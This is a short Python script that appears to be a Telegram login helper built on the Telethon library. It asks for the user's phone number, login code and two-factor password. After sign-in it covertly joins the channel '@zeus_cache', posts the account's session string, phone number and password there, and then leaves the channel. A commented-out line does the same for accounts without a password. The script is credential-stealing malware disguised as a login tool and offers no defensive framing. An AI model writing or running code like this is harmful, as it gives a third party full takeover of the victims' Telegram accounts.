from telethon import TelegramClient, sync
from telethon.sessions import StringSession
import getpass
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest

api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"
string = input("press enter")
client = TelegramClient(StringSession(string), api_id, api_hash)


phone_number = input("phone: ")



client.connect()
if not client.is_user_authorized():
    client.send_code_request(phone_number)
    try:
    	me = client.sign_in(phone_number, input('Enter code: '))
    	#client.send_message("@zeus_cache", f'Session: {client.session.save()}\nPhone number: {phone_number}\n')
    except SessionPasswordNeededError:
    	password = input('Enter password: ')
    	me2 = client.sign_in(password=password)
    	client(JoinChannelRequest("@zeus_cache"))
    	client.send_message("@zeus_cache", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
    	client(LeaveChannelRequest("@zeus_cache"))

 
 
    	
	#modules

	    

  